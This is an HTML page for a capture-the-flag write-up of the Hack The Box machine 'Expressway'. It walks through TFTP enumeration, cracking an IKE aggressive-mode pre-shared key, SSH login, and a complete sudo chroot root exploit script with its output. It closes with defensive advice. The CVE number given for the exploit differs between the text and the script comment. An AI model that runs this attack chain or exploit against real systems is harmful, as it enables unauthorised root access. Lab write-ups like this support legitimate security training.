@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Expressway Writeup | PLSCARRYME - HTB Writeups</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid #9fef00;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #9fef00;
+            text-decoration: none;
+        }
+
+        .back-link {
+            color: #9fef00;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Writeup Header */
+        .writeup-header {
+            text-align: center;
+            padding: 3rem 0;
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            margin-bottom: 3rem;
+        }
+
+        .writeup-title {
+            font-size: 3rem;
+            color: #9fef00;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
+        }
+
+        .writeup-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            opacity: 0.8;
+        }
+
+        .difficulty {
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+        }
+
+        .difficulty.easy { background: #28a745; }
+        .difficulty.medium { background: #ffc107; color: #000; }
+        .difficulty.hard { background: #dc3545; }
+
+        .writeup-tags {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tag {
+            background: rgba(159, 239, 0, 0.2);
+            color: #9fef00;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.8rem;
+        }
+
+        /* Content */
+        .writeup-content {
+            padding-bottom: 3rem;
+        }
+
+        .writeup-content h1,
+        .writeup-content h2,
+        .writeup-content h3 {
+            color: #9fef00;
+            margin: 2rem 0 1rem 0;
+            border-left: 4px solid #9fef00;
+            padding-left: 1rem;
+        }
+
+        .writeup-content h1 { font-size: 2rem; }
+        .writeup-content h2 { font-size: 1.5rem; }
+        .writeup-content h3 { font-size: 1.2rem; }
+
+        .writeup-content p {
+            margin-bottom: 1.5rem;
+            text-align: justify;
+        }
+
+        .writeup-content ul,
+        .writeup-content ol {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+
+        .writeup-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Code blocks */
+        .writeup-content pre {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        .writeup-content code {
+            color: #9fef00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .writeup-content p code {
+            background: rgba(159, 239, 0, 0.2);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        /* Images */
+        .writeup-content img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border: 1px solid rgba(159, 239, 0, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Blockquotes */
+        .writeup-content blockquote {
+            border-left: 4px solid #9fef00;
+            background: rgba(159, 239, 0, 0.1);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+            font-style: italic;
+        }
+
+        /* Navigation buttons */
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 3rem 0;
+            gap: 1rem;
+        }
+
+        .nav-button {
+            background: linear-gradient(45deg, #9fef00, #7bc800);
+            color: #000;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: transform 0.2s ease;
+            flex: 1;
+            text-align: center;
+            max-width: 200px;
+        }
+
+        .nav-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .nav-button.disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Progress bar */
+        .reading-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0%;
+            height: 3px;
+            background: linear-gradient(to right, #9fef00, #7bc800);
+            z-index: 1000;
+            transition: width 0.1s ease;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .writeup-title {
+                font-size: 2rem;
+            }
+
+            .writeup-meta {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .writeup-content pre {
+                padding: 1rem;
+                font-size: 0.8rem;
+            }
+
+            .nav-buttons {
+                flex-direction: column;
+            }
+
+            .nav-button {
+                max-width: none;
+            }
+        }
+
+        /* Highlight boxes */
+        .info-box {
+            background: rgba(0, 123, 255, 0.1);
+            border-left: 4px solid #007bff;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .success-box {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .step-section {
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        /* Toggle sections */
+        details {
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            border: 1px solid rgba(159, 239, 0, 0.1);
+        }
+
+        summary {
+            font-weight: 600;
+            font-size: 1.5em;
+            line-height: 1.3;
+            margin: 0;
+            padding: 1.5rem;
+            cursor: pointer;
+            color: #9fef00;
+            border-radius: 12px;
+            transition: background 0.3s ease;
+        }
+
+        summary:hover {
+            background: rgba(159, 239, 0, 0.05);
+        }
+
+        details[open] summary {
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+            border-radius: 12px 12px 0 0;
+        }
+
+        .indented {
+            padding: 1.5rem;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
+        }
+
+        th {
+            background: rgba(159, 239, 0, 0.1);
+            color: #9fef00;
+            font-weight: bold;
+        }
+
+        tr:hover {
+            background: rgba(159, 239, 0, 0.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="reading-progress" id="reading-progress"></div>
+    
+    <header>
+        <nav class="container">
+            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
+            <a href="../index.html" class="back-link">
+                <i class="fas fa-arrow-left"></i>
+                Back to Home
+            </a>
+        </nav>
+    </header>
+
+    <main class="container">
+        <section class="writeup-header">
+            <h1 class="writeup-title">🚀 Expressway</h1>
+            
+            <div class="writeup-meta">
+                <div class="meta-item">
+                    <i class="fas fa-calendar"></i>
+                    <span>September 21, 2025</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-desktop"></i>
+                    <span>Linux</span>
+                </div>
+                <div class="meta-item">
+                    <i class="fas fa-clock"></i>
+                    <span>2 hours</span>
+                </div>
+                <div class="meta-item">
+                    <span class="difficulty easy">Easy</span>
+                </div>
+            </div>
+
+            <div class="writeup-tags">
+                <span class="tag">TFTP</span>
+                <span class="tag">IPsec/IKE</span>
+                <span class="tag">PSK Cracking</span>
+                <span class="tag">Cisco Configuration</span>
+                <span class="tag">CVE-2025-32462</span>
+                <span class="tag">Sudo Privilege Escalation</span>
+            </div>
+        </section>
+
+        <section class="writeup-content">
+            <details open>
+                <summary>Enumeration</summary>
+                <div class="indented">
+                    <h3>🔍 1. Initial Setup</h3>
+                    <p>Started by adding the target to our hosts file for easy reference:</p>
+                    
+                    <pre><code class="language-bash">echo "10.129.242.197 expressway.htb" | sudo tee -a /etc/hosts</code></pre>
+
+                    <hr>
+
+                    <h3>🔍 2. Nmap Port Scan</h3>
+                    <p>Performed a comprehensive scan to identify running services:</p>
+                    
+                    <pre><code class="language-bash">nmap -Pn -A 10.129.242.197</code></pre>
+
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Service</th>
+                                <th>Version</th>
+                                <th>Notes</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>22/tcp</strong></td>
+                                <td>SSH</td>
+                                <td>OpenSSH 10.0p2 Debian 8</td>
+                                <td>Standard SSH service</td>
+                            </tr>
+                            <tr>
+                                <td><strong>69/udp</strong></td>
+                                <td>TFTP</td>
+                                <td>Netkit tftpd/atftpd</td>
+                                <td>File transfer service</td>
+                            </tr>
+                            <tr>
+                                <td><strong>500/udp</strong></td>
+                                <td>IKE</td>
+                                <td>PSK + XAUTH</td>
+                                <td>IPsec key exchange</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4500/udp</strong></td>
+                                <td>NAT-T</td>
+                                <td>IPsec NAT traversal</td>
+                                <td>VPN support</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <hr>
+
+                    <h3>🔐 3. IKE Aggressive Mode Probe</h3>
+                    <p>Discovered the VPN identity and authentication method:</p>
+
+                    <pre><code class="language-bash">sudo ike-scan -A --id 'ike@expressway.htb' --idtype 3 10.129.242.197</code></pre>
+
+                    <div class="info-box">
+                        <strong>Key Findings:</strong>
+                        <ul>
+                            <li>Identity: <code>ike@expressway.htb</code></li>
+                            <li>Authentication: PSK (Pre-Shared Key)</li>
+                            <li>XAUTH support enabled</li>
+                            <li>Encryption: 3DES, Hash: SHA1, Group: modp1024</li>
+                        </ul>
+                    </div>
+
+                    <hr>
+
+                    <h3>📁 4. TFTP File Discovery</h3>
+                    <p>Used Nmap's TFTP enumeration script to discover available files:</p>
+
+                    <pre><code class="language-bash">sudo nmap -sU -p 69 --script tftp-enum -Pn 10.129.242.197</code></pre>
+
+                    <p>Found a Cisco router configuration file: <code>ciscortr.cfg</code></p>
+
+                    <pre><code class="language-bash">tftp 10.129.242.197
+tftp> mode binary
+tftp> get ciscortr.cfg ciscortr.cfg
+tftp> quit</code></pre>
+
+                    <hr>
+
+                    <h3>📝 5. Configuration Analysis</h3>
+                    <p>The Cisco configuration file revealed critical VPN settings:</p>
+
+                    <ul>
+                        <li><strong>VPN Group:</strong> <code>rtr-remote</code> with key <code>secret-password</code></li>
+                        <li><strong>EZVPN Config:</strong> <code>group 2 key secret-password</code></li>
+                        <li><strong>Domain:</strong> <code>expressway.htb</code></li>
+                        <li><strong>Username:</strong> <code>ike</code> (password redacted in config)</li>
+                    </ul>
+
+                    <div class="warning-box">
+                        <strong>Attack Vector Identified:</strong> The configuration suggests we can crack the PSK using IKE aggressive mode, then potentially use the credentials for SSH access.
+                    </div>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Initial Access</summary>
+                <div class="indented">
+                    <h3>🔓 6. PSK Cracking Setup</h3>
+                    <p>Generated a PSK crack file using IKE aggressive mode:</p>
+
+                    <pre><code class="language-bash">sudo ike-scan -A --id 'ike@expressway.htb' --idtype 3 --pskcrack=psk.bin 10.129.242.197</code></pre>
+
+                    <p>This created a <code>psk.bin</code> file containing the handshake data needed for offline cracking.</p>
+
+                    <hr>
+
+                    <h3>💥 7. Offline PSK Cracking</h3>
+                    <p>Used psk-crack with rockyou.txt wordlist:</p>
+
+                    <pre><code class="language-bash">psk-crack -v -d /usr/share/wordlists/rockyou.txt psk.bin</code></pre>
+
+                    <div class="success-box">
+                        <strong>PSK Recovered:</strong> <code>freakingrockstarontheroad</code>
+                        <br>
+                        <strong>Iterations:</strong> 8,045,040 in 9.312 seconds (863,945.15 iterations/sec)
+                    </div>
+
+                    <hr>
+
+                    <h3>🚪 8. SSH Access</h3>
+                    <p>With the recovered PSK, attempted SSH login as user 'ike':</p>
+
+                    <pre><code class="language-bash">ssh ike@10.129.242.197</code></pre>
+
+                    <p>Successfully authenticated using the PSK as the password!</p>
+
+                    <pre><code class="language-bash">ike@expressway:~$ ls
+user.txt
+ike@expressway:~$ cat user.txt
+[USER FLAG RETRIEVED]</code></pre>
+
+                    <div class="success-box">
+                        <strong>User Access Achieved:</strong> Successfully logged in as user 'ike' and obtained the user flag.
+                    </div>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Privilege Escalation</summary>
+                <div class="indented">
+                    <h3>🔍 9. System Enumeration</h3>
+                    <p>Started by checking user privileges and system information:</p>
+
+                    <pre><code class="language-bash">ike@expressway:~$ id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+
+ike@expressway:~$ sudo -l
+Sorry, user ike may not run sudo on expressway</code></pre>
+
+                    <hr>
+
+                    <h3>🔍 10. Sudo Version Check</h3>
+                    <p>Checked the sudo version for known vulnerabilities:</p>
+
+                    <pre><code class="language-bash">ike@expressway:~$ sudo --version
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17</code></pre>
+
+                    <div class="warning-box">
+                        <strong>Vulnerability Identified:</strong> Sudo version 1.9.17 is affected by CVE-2025-32462, a privilege escalation vulnerability.
+                    </div>
+
+                    <hr>
+
+                    <h3>💀 11. CVE-2025-32462 Exploitation</h3>
+                    <p>Created and executed an exploit script for the sudo vulnerability:</p>
+
+                    <pre><code class="language-bash">#!/bin/bash
+# sudo-chwoot.sh
+# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd ${STAGE?} || exit 1
+
+cat > woot1337.c<<EOF
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void woot(void) {
+  setreuid(0,0);
+  setregid(0,0);
+  chdir("/");
+  execl("/bin/bash", "/bin/bash", NULL);
+}
+EOF
+
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "woot!"
+sudo -R woot woot
+rm -rf ${STAGE?}</code></pre>
+
+                    <hr>
+
+                    <h3>👑 12. Root Access</h3>
+                    <p>Executed the exploit and gained root privileges:</p>
+
+                    <pre><code class="language-bash">ike@expressway:~$ ./exploit.sh
+woot!
+root@expressway:/# id
+uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
+
+root@expressway:/# cd /root
+root@expressway:/root# ls
+root.txt
+root@expressway:/root# cat root.txt
+[ROOT FLAG RETRIEVED]</code></pre>
+
+                    <div class="success-box">
+                        <strong>Root Access Achieved:</strong> Successfully escalated privileges to root and obtained the root flag!
+                    </div>
+                </div>
+            </details>
+
+            <!-- Summary Section -->
+            <div class="step-section">
+                <h2>Attack Chain Summary</h2>
+                <p>This writeup demonstrated a straightforward attack path leveraging network service vulnerabilities and a recent sudo privilege escalation:</p>
+
+                <pre><code class="language-text">TFTP File Discovery
+    → Cisco Configuration Analysis
+    → IKE Aggressive Mode PSK Extraction
+    → Offline PSK Cracking
+    → SSH Access as 'ike'
+    → CVE-2025-32462 Sudo Exploitation
+    → Root Privilege Escalation</code></pre>
+
+                <h3>Key Techniques Demonstrated</h3>
+                <ul>
+                    <li><strong>TFTP Enumeration:</strong> Discovering exposed configuration files</li>
+                    <li><strong>IKE Aggressive Mode Attack:</strong> Extracting PSK handshake for offline cracking</li>
+                    <li><strong>Offline Password Cracking:</strong> Using wordlist attacks against network protocols</li>
+                    <li><strong>Configuration Analysis:</strong> Mining sensitive information from network device configs</li>
+                    <li><strong>CVE Exploitation:</strong> Leveraging recent sudo vulnerabilities for privilege escalation</li>
+                </ul>
+
+                <h3>Tools Used</h3>
+                <ul>
+                    <li><strong>Nmap:</strong> Network reconnaissance and UDP service enumeration</li>
+                    <li><strong>ike-scan:</strong> IKE aggressive mode probing and PSK extraction</li>
+                    <li><strong>psk-crack:</strong> Offline pre-shared key cracking</li>
+                    <li><strong>TFTP Client:</strong> File retrieval from TFTP service</li>
+                    <li><strong>SSH:</strong> Remote shell access</li>
+                    <li><strong>GCC:</strong> Compiling exploit code for privilege escalation</li>
+                </ul>
+
+                <h3>Critical Vulnerabilities Exploited</h3>
+                <ul>
+                    <li><strong>Exposed TFTP Service:</strong> Sensitive configuration files accessible without authentication</li>
+                    <li><strong>IKE Aggressive Mode:</strong> PSK vulnerable to offline dictionary attacks</li>
+                    <li><strong>Weak PSK:</strong> Pre-shared key found in common wordlists</li>
+                    <li><strong>Password Reuse:</strong> VPN PSK used as SSH password</li>
+                    <li><strong>CVE-2025-32462:</strong> Sudo privilege escalation vulnerability</li>
+                </ul>
+
+                <div class="warning-box">
+                    <strong>Defensive Recommendations:</strong>
+                    <ul>
+                        <li>Disable or secure TFTP services - use SFTP or SCP for file transfers</li>
+                        <li>Avoid IKE Aggressive Mode - use Main Mode for VPN configurations</li>
+                        <li>Implement strong, unique pre-shared keys that resist dictionary attacks</li>
+                        <li>Avoid password reuse across different services and protocols</li>
+                        <li>Keep sudo updated and monitor for privilege escalation vulnerabilities</li>
+                        <li>Implement network segmentation to limit service exposure</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <div class="nav-buttons">
+            <a href="../index.html" class="nav-button">
+                <i class="fas fa-home"></i> Back to Home
+            </a>
+            <a href="../next/next-writeup.html" class="nav-button">
+                Next Writeup <i class="fas fa-arrow-right"></i>
+            </a>
+        </div>
+    </main>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // Reading progress bar
+        function updateReadingProgress() {
+            const article = document.querySelector('.writeup-content');
+            const progressBar = document.getElementById('reading-progress');
+            
+            const articleTop = article.offsetTop;
+            const articleHeight = article.offsetHeight;
+            const windowHeight = window.innerHeight;
+            const scrollTop = window.pageYOffset;
+            
+            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
+            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
+            
+            progressBar.style.width = progressPercentage + '%';
+        }
+
+        // Smooth scrolling for TOC links
+        document.querySelectorAll('.toc a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Initialize
+        window.addEventListener('scroll', updateReadingProgress);
+        window.addEventListener('load', updateReadingProgress);
+    </script>
+</body>
+</html>
